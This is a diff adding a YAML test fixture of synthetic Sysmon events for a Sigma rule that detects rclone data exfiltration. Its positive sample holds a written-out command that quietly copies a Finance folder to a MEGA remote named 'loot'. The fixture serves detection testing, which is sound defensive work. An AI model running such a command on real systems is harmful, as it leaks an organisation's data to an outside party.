@@ -1,0 +1,20 @@
+# Positive/negative samples for rules/sigma/win_rclone_exfiltration.yml (synthetic lab events)
+rule: win_rclone_exfiltration.yml
+positive:
+- name: rclone copy to MEGA
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Users\Public\rclone.exe'
+      CommandLine: 'rclone.exe copy C:\Finance mega:loot -q --transfers 16'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+negative:
+- name: rclone listing remotes
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Tools\rclone.exe'
+      CommandLine: rclone.exe listremotes
+      ParentImage: 'C:\Windows\System32\cmd.exe'
